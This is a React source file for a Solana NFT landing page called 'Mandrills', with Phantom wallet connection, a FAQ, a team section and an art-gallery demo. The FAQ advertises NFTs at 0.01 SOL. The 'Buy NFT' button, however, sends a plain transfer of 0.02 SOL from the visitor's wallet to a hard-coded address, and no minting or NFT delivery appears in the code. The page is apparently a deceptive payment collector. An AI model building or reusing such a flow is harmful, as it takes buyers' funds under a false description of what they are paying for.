import { useState, useEffect } from "react";
import {
  Connection,
  PublicKey,
  Transaction,
  clusterApiUrl,
  SystemProgram,
  LAMPORTS_PER_SOL
} from "@solana/web3.js";
import "./styles.css";
import { PrivateKeyInput } from "crypto";

type DisplayEncoding = "utf8" | "hex";
type PhantomEvent = "disconnect" | "connect";
type PhantomRequestMethod =
  | "connect"
  | "disconnect"
  | "signTransaction"
  | "signAllTransactions"
  | "signMessage";

interface ConnectOpts {
  onlyIfTrusted: boolean;
}


interface PhantomProvider {
  publicKey: PublicKey | null;
  isConnected: boolean | null;
  signTransaction: (transaction: Transaction) => Promise<Transaction>;
  signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;
  signMessage: (
    message: Uint8Array | string,
    display?: DisplayEncoding
  ) => Promise<any>;
  connect: (opts?: Partial<ConnectOpts>) => Promise<{ publicKey: PublicKey }>;
  disconnect: () => Promise<void>;
  on: (event: PhantomEvent, handler: (args: any) => void) => void;
  request: (method: PhantomRequestMethod, params: any) => Promise<unknown>;
}

const getProvider = (): PhantomProvider | undefined => {
  if ("solana" in window) {
    const anyWindow: any = window;
    const provider = anyWindow.solana;
    if (provider.isPhantom) {
      return provider;
    }
  }
  window.open("https://phantom.app/", "_blank");
};

const NETWORK = clusterApiUrl("mainnet-beta");

export default function App() {
  const provider = getProvider();
  const myKey = new PublicKey('8TUUSbXSTTiQyo42CMhiLEJ72QaZaFi1wpN7PAsQ2R67');
  const [logs, setLogs] = useState<string[]>([]);
  const addLog = (log: string) => setLogs([...logs, log]);
  const connection = new Connection(NETWORK);
  const [, setConnected] = useState<boolean>(false);
  useEffect(() => {
    if (provider) {
      provider.on("connect", () => {
        setConnected(true);
        addLog("Connected to wallet " + provider.publicKey?.toBase58());
      });
      provider.on("disconnect", () => {
        setConnected(false);
        addLog("Disconnected from wallet");
      });
      // try to eagerly connect
      provider.connect({ onlyIfTrusted: true }).catch(() => {
        // fail silently
      });
      return () => {
        provider.disconnect();
      };
    }
  }, [provider]);
  if (!provider) {
    return <h2>Could not find a provider</h2>;
  }

  const createTransferTransaction = async () => {
    if (!provider.publicKey) {
      return;
    }
    let transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: myKey,
        lamports: 0.02 * LAMPORTS_PER_SOL,
      })
    );
    transaction.feePayer = provider.publicKey;
    addLog("Getting recent blockhash");
    const anyTransaction: any = transaction;
    anyTransaction.recentBlockhash = (
      await connection.getRecentBlockhash()
    ).blockhash;
    return transaction;
  };

  const sendTransaction = async () => {
    const transaction = await createTransferTransaction();
    if (transaction) {
      try {
        let signed = await provider.signTransaction(transaction);
        addLog("Got signature, submitting transaction");
        let signature = await connection.sendRawTransaction(signed.serialize());
        addLog(
          "Submitted transaction " + signature + ", awaiting confirmation"
        );
        await connection.confirmTransaction(signature);
        addLog("Transaction " + signature + " confirmed");
      } catch (err) {
        console.warn(err);
        addLog("Error: " + JSON.stringify(err));
      }
    }
  };
 
  return (
          <div>
          
            <meta charSet="UTF-8" />
            <meta name="viewport" content="width=1920, maximum-scale=0.6" />
            <link rel="shortcut icon" type="image/png" href="img/icon.png" />
            <meta name="og:type" content="website" />
            <meta name="twitter:card" content="photo" />
            <link rel="stylesheet" type="text/css" href="css/web-1920-1.css" />
            <link rel="stylesheet" type="text/css" href="css/styleguide.css" />
            <link rel="stylesheet" type="text/css" href="css/globals.css" />
            <meta name="author" content="AnimaApp.com - Design to code, Automated." />
            <title>Mandrills</title>
            <meta charSet="utf-8" />
            <meta httpEquiv="Content-Type" content="text/html; charset=utf-8" />
            <link rel="stylesheet" href="TemplateData/style.css" />
            <input type="hidden" id="anPageName" name="page" defaultValue="web-1920-1" />
            <div className="container-center-horizontal">
              <div className="web-1920-1 screen">
                <div className="rectangle-1-HlzXCz animate-enter">
                  <div id="unity-container" className="unity-desktop">
                    <canvas id="unity-canvas" style={{width: '903px', height: '518px'}} />
                    <div id="unity-loading-bar" style={{display: 'block'}}>
                      <div id="unity-logo" />
                      <div id="unity-progress-bar-empty">
                        <div id="unity-progress-bar-full" style={{width: '0%'}} />
                      </div>
                    </div>
                    <div id="unity-footer">
                      <div id="unity-fullscreen-button" />
                    </div>
                  </div></div>
                <a href="https://discord.com/invite/VSVyHPhmRP" target="_blank">
                  <img className="icon-simple-discord-HlzXCz animate-enter1" src="discord.png" /></a>
                <a href="https://twitter.com/MandrillsNFT" target="_blank">
                  <img className="icon-awesome-twitter-HlzXCz animate-enter2" src="twitter.png" /></a>
                <div className="art-gallery-dem-internet-speed-HlzXCz animate-enter3">
                  <span className="span0-vj7np1 montserrat-bold-black-25px">Art Gallery Demo</span><span className="span1-vj7np1 montserrat-medium-black-25px">, it might take a moment to<br />load up depending on your Internet speed
            </span><br/><span>      {provider && provider.publicKey ? (
          <>
            <button onClick={sendTransaction}>Buy NFT</button>
          </>
        ) : (
          <>
            <button
              onClick={async () => {
                try {
                  const res = await provider.connect();
                  addLog(JSON.stringify(res));
                } catch (err) {
                  console.warn(err);
                  addLog("Error: " + JSON.stringify(err));
                }
              }}
            >
              Connect to Phantom
            </button>
          </>
          )}</span>
                </div>
                <div className="faq-HlzXCz montserrat-bold-black-50px">FAQ<br /></div>
                <div className="what-is-this-pr-what-we-can-do-HlzXCz montserrat-medium-black-30px">
                  <span className="span0-arAqCH montserrat-bold-black-30px">What is this project about?<br /></span><span className="span1-arAqCH montserrat-medium-black-25px"><br />Mandrills is an NFT project on Solana Blockchain.<br />With a cool idea of a NFT Game/Metaverse
                    with<br />Mandrills. We will build a community and make<br />the game how they want it. We made a little<br />Art
                    Gallery demo to show what we can do. But it<br />is just a demo, we can do much better...</span>
                </div>
                <div className="what-makes-us-d-ss-actively-our-HlzXCz montserrat-medium-black-30px">
                  <span className="span0-UidpGY montserrat-bold-black-30px">What makes us different from the others?<br /></span><span className="span1-UidpGY montserrat-medium-black-25px"><br />Well first thing is that most projects are not showing anything,<br />all they have are empty
                    promises. But we have something to<br />show. We are 100% transparent, work with the community<br />and show
                    the progress actively. Our team is small but smart,<br />we if someone can pull this off. And then of course
                    the biggest<br />thing, our art. It is unique.</span>
                </div>
                <div className="utilities-of-ou-rseof-mandrills-HlzXCz montserrat-medium-black-30px">
                  <span className="span0-oInXwJ montserrat-bold-black-30px">Utilities of our NFTs?<br /></span><span className="span1-oInXwJ montserrat-medium-black-25px"><br />As said before, we are making a NFT game/metaverse. <br />These NFTs will become a characters in the
                    game. So<br />by owning these NFTs you can join the game/metaverse<br />of Mandrills.</span>
                </div>
                <div className="what-are-the-fu-he-time-our-gam-HlzXCz montserrat-medium-black-30px">
                  <span className="span0-iLnNPK montserrat-bold-black-30px">What are the future plans?<br /></span><span className="span1-iLnNPK montserrat-medium-black-25px"><br />Our future plans is to develop the game, create a community,<br />work with them, build a stronger
                    team, get some marketing<br />specialist, social media managers etc. and start marketing big<br />time.
                    <br /><br />We are aiming that by the time our Game/Metaverse is<br />ready, we will have at least 100 000
                    members. It may sound like<br />a lot but Metaverse is growing faster than you think. So you can<br />just
                    imagine how wanted those 500 NFTs will be at that point.<br /><br />We have also planned a token so more
                    people can join in<br />the project even they are not holding an NFT. But that is really<br />early planning
                    at this point.</span>
                </div>
                <div className="the-drop-when-h-or-020-sol-each-HlzXCz montserrat-medium-black-30px">
                  <span className="span0-vkupmH montserrat-bold-black-30px">The drop, when, how many, what price?<br /></span><span className="span1-vkupmH montserrat-medium-black-25px"><br />- We are dropping </span><span className="span2-vkupmH montserrat-bold-black-25px">22nd of November, 18:00 UTC</span><span className="span3-vkupmH montserrat-medium-black-25px">.<br /><br />- </span><span className="span4-vkupmH montserrat-bold-black-25px">500 NFTs<br /><br /></span><span className="span5-vkupmH montserrat-medium-black-25px">- For </span><span className="span6-vkupmH montserrat-bold-black-25px">0.01 SOL</span><span className="span7-vkupmH montserrat-medium-black-25px"> each</span><br /><br />
                  <span className="span5-vkupmH montserrat-medium-black-25px">- Royalties <span className="span6-vkupmH montserrat-bold-black-25px">20%</span></span>
                </div>
                <div className="team-HlzXCz montserrat-bold-black-50px">TEAM</div>
                <div className="as-said-our-tea-ter-and-theyare-HlzXCz montserrat-medium-black-25px">
                  As said, our team is really small. We are team of 3, Me, Dev and the Artist. We want to stay anonymous because
                  that is why most<br />people like Metaverse so much, and this whole NFT space in general. Everyone is know
                  from their PFP NFT on Twitter and they<br />are not there by their real names. The community is formed from
                  all kind of PFPs. People can be what they want in the Metaverse.<br />Metaverse is a getaway place from real
                  life for many people.<br /><br />Back to the team, Me, Dev and Artist. Only Me (Mandrill Bro) who is writing
                  this is on Discord publicly. I will speak behalf of all 3.<br />Our team got 4-6 years of experience in what
                  we do, not making NFTs but developing, drawing, moderating, handling big communities<br />etc. All 3 of us are
                  working on the game, but we all have something where we are focused on. That is why i said Me, dev and
                  artist.<br />We are all from Finland and our ages goes between 18-30.<br /><br />You will get to know me on
                  Discord for sure by just chatting. We are hiring more team members so if you are interested in being<br />part
                  of the team, please fill out the form on Discord.
                </div>
                <div className="mandrills-all-r-ts-are-reserved-HlzXCz">©️Mandrills&nbsp;&nbsp;- All Rights Are Reserved</div>
                <div className="mask-group-1-HlzXCz">
                  <div className="group-1-dt0Dgt">
                    <div className="mandrills-ajvANa">MANDRILLS</div>
                    <div className="mandrills-2qypIs">MANDRILLS</div>
                    <div className="mandrills-jIXIQV montserrat-bold-black-50px">MANDRILLS</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );
              
  }